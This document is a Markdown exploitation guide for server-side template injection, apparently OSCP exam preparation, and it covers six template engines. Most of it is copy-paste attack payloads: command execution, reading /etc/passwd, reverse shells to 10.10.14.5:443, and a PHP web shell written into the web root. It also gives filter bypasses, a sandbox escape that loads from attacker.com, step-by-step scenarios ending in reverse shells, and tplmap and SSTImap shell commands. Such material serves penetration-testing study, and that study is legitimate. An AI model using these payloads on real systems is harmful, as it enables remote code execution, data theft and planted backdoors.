# Server-Side Template Injection (SSTI) Exploitation Guide

## Table of Contents
1. [SSTI Basics](#ssti-basics)
2. [Detection Techniques](#detection-techniques)
3. [Jinja2 (Python/Flask)](#jinja2-pythonflask)
4. [Twig (PHP)](#twig-php)
5. [Freemarker (Java)](#freemarker-java)
6. [ERB (Ruby)](#erb-ruby)
7. [Tornado (Python)](#tornado-python)
8. [Mako (Python)](#mako-python)
9. [OSCP Scenarios](#oscp-scenarios)
10. [Automation Tools](#automation-tools)

---

## SSTI Basics

### What is SSTI?
Server-Side Template Injection occurs when user input is embedded into template engines without proper sanitization, allowing attackers to inject template directives that execute arbitrary code on the server.

### Impact
- **Remote Code Execution (RCE)**
- **Information disclosure**
- **Access to internal methods/objects**
- **Server compromise**

### Vulnerable Code Example (Flask/Jinja2)
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    template = f"<h1>Hello {name}!</h1>"  # VULNERABLE
    return render_template_string(template)
```

**Attack:**
```
http://target.com/greet?name={{7*7}}
Response: <h1>Hello 49!</h1>
```

---

## Detection Techniques

### Template Expression Detection

#### Basic Math Operations
```
${7*7}
{{7*7}}
{{7*'7'}}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

#### Template-Specific Detection Payloads
```
# Jinja2 (Python)
{{7*7}}
{{7*'7'}}

# Twig (PHP)
{{7*7}}
{{7*'7'}}

# Freemarker (Java)
${7*7}
#{7*7}

# Velocity (Java)
#set($x=7*7)$x

# Smarty (PHP)
{7*7}
{$smarty.version}

# ERB (Ruby)
<%= 7*7 %>

# Tornado (Python)
{{7*7}}

# Mako (Python)
${7*7}
```

### Identify Template Engine

#### Error-Based Detection
```
# Inject invalid syntax to trigger errors
{{%%%}}
${%%%}
<%= %%% %>
{%%%}

# Errors reveal template engine:
- "TemplateSyntaxError" → Jinja2
- "Twig_Error_Syntax" → Twig
- "freemarker.core.ParseException" → Freemarker
- "ActionView::Template::Error" → ERB
```

#### Polyglot Detection
```
${{<%[%'"}}%\
```

Use this to test multiple template engines at once, observe which characters cause errors.

---

## Jinja2 (Python/Flask)

### Detection
```python
# Test payloads
{{7*7}}              # Output: 49
{{7*'7'}}            # Output: 7777777
{{'abc'.upper()}}    # Output: ABC
{{config}}           # Shows config object
```

### Basic Exploitation

#### Read Configuration
```python
# Flask config (contains SECRET_KEY, etc.)
{{config}}
{{config.items()}}

# Access specific config
{{config['SECRET_KEY']}}
```

#### Object Exploration
```python
# List all classes
{{''.__class__.__mro__[1].__subclasses__()}}

# Get current object attributes
{{self.__dict__}}
{{self.__init__.__globals__}}
```

### Remote Code Execution (RCE)

#### Method 1: Using subprocess.Popen
```python
# Find subprocess.Popen class
{{''.__class__.__mro__[1].__subclasses__()}}

# Usually at index 414 (varies by Python version)
{{''.__class__.__mro__[1].__subclasses__()[414]}}

# Execute command
{{''.__class__.__mro__[1].__subclasses__()[414]('whoami',shell=True,stdout=-1).communicate()}}

# Generic payload (iterate to find correct index)
{% for i in range(500) %}
  {% if ''.__class__.__mro__[1].__subclasses__()[i].__name__ == 'Popen' %}
    {{i}}
  {% endif %}
{% endfor %}
```

#### Method 2: Using os module
```python
# Access os module via __builtins__
{{self.__init__.__globals__.__builtins__}}

# Import os
{{self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

# Alternative
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
```

#### Method 3: Using eval
```python
{{self.__init__.__globals__.__builtins__.eval("__import__('os').popen('whoami').read()")}}

# Execute reverse shell
{{self.__init__.__globals__.__builtins__.eval("__import__('os').popen('bash -c \"bash -i >& /dev/tcp/10.10.14.5/443 0>&1\"').read()")}}
```

### Jinja2 RCE Payloads (Copy-Paste Ready)

#### Payload 1: Direct Command Execution
```python
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

#### Payload 2: File Read
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```

#### Payload 3: Reverse Shell
```python
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"').read()}}
```

#### Payload 4: Universal RCE (Find Popen)
```python
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen('whoami').read()}}
  {% endif %}
{% endfor %}
```

#### Payload 5: Enumerate Available Classes
```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

### Jinja2 Filter Bypass

#### Blacklisted "config"
```python
# Use attr filter
{{self|attr('__init__')|attr('__globals__')}}

# Use request object
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

#### Blacklisted Quotes
```python
# Use chr() or request.args
{{config.__class__.__init__.__globals__[request.args.x].popen(request.args.cmd).read()}}&x=os&cmd=whoami

# Or use dict access
{{config.__class__.__init__.__globals__['\x6f\x73'].popen('id').read()}}
```

#### Blacklisted Brackets []
```python
# Use __getitem__
{{config.__class__.__init__.__globals__.__getitem__('os').popen('id').read()}}

# Use attr()
{{(config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')).popen('id').read()}}
```

---

## Twig (PHP)

### Detection
```php
{{7*7}}              # Output: 49
{{7*'7'}}            # Output: 7777777
{{"string"|upper}}   # Output: STRING
```

### Basic Exploitation

#### Information Disclosure
```php
{{_self}}            # Shows template object
{{app}}              # Shows app context (Symfony)
{{dump(app)}}        # Dump app object (if debug mode)
```

### Remote Code Execution (RCE)

#### Method 1: Using _self.env
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
```

#### Method 2: Using getFilter
```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

#### Method 3: Map/Filter Abuse
```php
{{["id"]|map("system")|join}}
{{{"<?php system($_GET['cmd']);":"/var/www/html/shell.php"}|map("file_put_contents")}}
```

### Twig RCE Payloads (Copy-Paste Ready)

#### Payload 1: System Command
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
```

#### Payload 2: Write Web Shell
```php
{{{"<?php system($_GET['cmd']);":"/var/www/html/shell.php"}|map("file_put_contents")}}
```

#### Payload 3: Read Files
```php
{{"/etc/passwd"|file_get_contents}}
```

#### Payload 4: Alternative RCE
```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

### Twig Filter Bypass

#### Sandbox Escape (Twig 1.x)
```php
{{_self.env.setCache("ftp://attacker.com:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

#### Alternative Methods
```php
# Using sort with custom callback
{{[0,1,2]|sort('system')|join}}

# Using filter
{{['id']|filter('system')}}
```

---

## Freemarker (Java)

### Detection
```java
${7*7}               # Output: 49
#{7*7}               # Output: 49
${7*"7"}             # Error (type mismatch)
```

### Basic Exploitation

#### Information Disclosure
```java
${.version}                    # Freemarker version
${.now}                        # Current date/time
${.data_model}                 # Available data model
${.globals}                    # Global variables
```

### Remote Code Execution (RCE)

#### Method 1: Using Execute
```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("whoami")}
```

#### Method 2: Using ObjectConstructor
```java
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
${value("java.lang.ProcessBuilder","whoami").start()}
```

#### Method 3: Using JythonRuntime
```java
<#assign classloader=object?class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("whoami")}
```

### Freemarker RCE Payloads (Copy-Paste Ready)

#### Payload 1: Execute Command
```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}
```

#### Payload 2: File Read
```java
<#assign uri=object?class.protectionDomain.classLoader.loadClass("java.net.URI")>
<#assign input=uri?new()>
${input.create("file:///etc/passwd").toURL().openConnection().getInputStream()?read()}
```

#### Payload 3: Reverse Shell
```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'")}
```

#### Payload 4: Write File
```java
<#assign file="freemarker.template.utility.Execute"?new()>
${file("bash -c 'echo test > /tmp/pwned'")}
```

---

## ERB (Ruby)

### Detection
```ruby
<%= 7*7 %>           # Output: 49
<%= 7*"7" %>         # Output: 7777777
<%= "string".upcase %> # Output: STRING
```

### Remote Code Execution (RCE)

#### Method 1: System Command
```ruby
<%= system("whoami") %>
<%= `whoami` %>
<%= %x(whoami) %>
```

#### Method 2: IO.popen
```ruby
<%= IO.popen('whoami').readlines() %>
```

#### Method 3: eval
```ruby
<%= eval("system('whoami')") %>
```

### ERB RCE Payloads (Copy-Paste Ready)

#### Payload 1: Simple Command
```ruby
<%= system("whoami") %>
```

#### Payload 2: Read File
```ruby
<%= File.open("/etc/passwd").read %>
```

#### Payload 3: Reverse Shell
```ruby
<%= system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'") %>
```

#### Payload 4: Alternative Execution
```ruby
<%= `id` %>
<%= %x(id) %>
```

---

## Tornado (Python)

### Detection
```python
{{7*7}}              # Output: 49
{{7*'7'}}            # Output: 7777777
```

### Remote Code Execution (RCE)

#### Method 1: Import os
```python
{% import os %}{{os.system('whoami')}}
```

#### Method 2: Using subprocess
```python
{% import subprocess %}{{subprocess.check_output('whoami',shell=True)}}
```

### Tornado RCE Payloads (Copy-Paste Ready)

#### Payload 1: Execute Command
```python
{% import os %}{{os.popen("whoami").read()}}
```

#### Payload 2: Reverse Shell
```python
{% import os %}{{os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'")}}
```

---

## Mako (Python)

### Detection
```python
${7*7}               # Output: 49
${7*'7'}             # Output: 7777777
```

### Remote Code Execution (RCE)

#### Method 1: Import and Execute
```python
<%
import os
os.system('whoami')
%>
```

#### Method 2: Inline Execution
```python
${__import__('os').system('whoami')}
```

### Mako RCE Payloads (Copy-Paste Ready)

#### Payload 1: Execute Command
```python
<%
import os
x=os.popen('whoami').read()
%>
${x}
```

#### Payload 2: One-liner
```python
${self.module.cache.util.os.system("whoami")}
```

#### Payload 3: Reverse Shell
```python
<%
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'")
%>
```

---

## OSCP Scenarios

### Scenario 1: Jinja2 SSTI to RCE
```python
# Step 1: Detect SSTI
http://target.com/greet?name={{7*7}}
# Response: Hello 49!

# Step 2: Confirm Jinja2
http://target.com/greet?name={{config}}
# Response shows Flask config

# Step 3: Execute command
http://target.com/greet?name={{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
# Response: www-data

# Step 4: Get reverse shell
# Start listener:
nc -nlvp 443

# Payload (URL-encoded):
http://target.com/greet?name={{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"').read()}}
```

### Scenario 2: Twig SSTI to Web Shell
```php
# Step 1: Detect SSTI
http://target.com/page?template={{7*7}}
# Response: 49

# Step 2: Write web shell
http://target.com/page?template={{{"<?php system($_GET['cmd']);":"/var/www/html/shell.php"}|map("file_put_contents")}}

# Step 3: Access web shell
http://target.com/shell.php?cmd=whoami

# Step 4: Get reverse shell
http://target.com/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
```

### Scenario 3: Freemarker SSTI
```java
# Step 1: Detect SSTI
http://target.com/render?template=${7*7}
# Response: 49

# Step 2: Execute command
http://target.com/render?template=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
# Response: tomcat

# Step 3: Reverse shell
http://target.com/render?template=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'")}
```

### Scenario 4: ERB SSTI (Ruby on Rails)
```ruby
# Step 1: Detect SSTI
http://target.com/welcome?name=<%= 7*7 %>
# Response: 49

# Step 2: Execute command
http://target.com/welcome?name=<%= system("whoami") %>
# Response: rails

# Step 3: Read sensitive files
http://target.com/welcome?name=<%= File.open("/etc/passwd").read %>

# Step 4: Reverse shell
http://target.com/welcome?name=<%= system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'") %>
```

---

## SSTI Testing Methodology

### 1. Detection Phase
```
Step 1: Identify input reflection
Step 2: Test basic math: {{7*7}}, ${7*7}, <%= 7*7 %>
Step 3: Test string multiplication: {{7*'7'}}
Step 4: Trigger errors with invalid syntax: {{%%}}
Step 5: Identify template engine from errors/behavior
```

### 2. Exploitation Phase
```
Step 1: Read documentation/config
Step 2: Enumerate available objects/classes
Step 3: Find RCE primitive (os, subprocess, eval, etc.)
Step 4: Execute commands
Step 5: Escalate to reverse shell
```

### 3. Testing Checklist
- [ ] Test all input parameters
- [ ] Test URL parameters
- [ ] Test POST body
- [ ] Test HTTP headers (User-Agent, Referer)
- [ ] Test JSON/XML inputs
- [ ] Test cookies
- [ ] Check error messages for template engine identification

---

## Automation Tools

### Tplmap (Automated SSTI Scanner)
```bash
# Install
git clone https://github.com/epinna/tplmap
cd tplmap

# Scan for SSTI
python2 tplmap.py -u 'http://target.com/page?name=test'

# Exploit with shell
python2 tplmap.py -u 'http://target.com/page?name=test' --os-shell

# Upload file
python2 tplmap.py -u 'http://target.com/page?name=test' --upload /local/file.txt /remote/path/file.txt

# Reverse shell
python2 tplmap.py -u 'http://target.com/page?name=test' --reverse-shell 10.10.14.5 443
```

### SSTImap
```bash
# Clone
git clone https://github.com/vladko312/SSTImap
cd SSTImap

# Scan
python3 sstimap.py -u 'http://target.com/page?name=test'

# Interactive shell
python3 sstimap.py -u 'http://target.com/page?name=test' --interactive
```

### Manual Testing (Burp Suite)
```
1. Send request to Repeater
2. Test payloads in parameter
3. Observe response
4. Iterate based on template engine
```

---

## Quick Reference

### Detection Payloads
```
{{7*7}}
${7*7}
<%= 7*7 %>
{{7*'7'}}
${{7*7}}
#{7*7}
```

### Quick RCE by Engine

**Jinja2:**
```python
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

**Twig:**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
```

**Freemarker:**
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

**ERB:**
```ruby
<%= system("whoami") %>
```

**Tornado:**
```python
{% import os %}{{os.popen("whoami").read()}}
```

**Mako:**
```python
${__import__('os').popen('whoami').read()}
```

---

## OSCP Exam Tips

1. **Test for SSTI early** - common in modern web apps
2. **Start with {{7*7}}** - universal detection
3. **Identify engine from errors** - saves time
4. **Use config object** in Jinja2 for quick wins
5. **Write web shell** if direct RCE fails (Twig)
6. **URL-encode payloads** properly
7. **Test all input fields** - not just obvious ones
8. **Combine with file upload** for persistence
9. **Document template engine** in report
10. **Keep payload library ready** - copy-paste for speed

---

**Remember**: SSTI is a powerful vulnerability that often leads to RCE. Master the detection and exploitation for each major template engine!
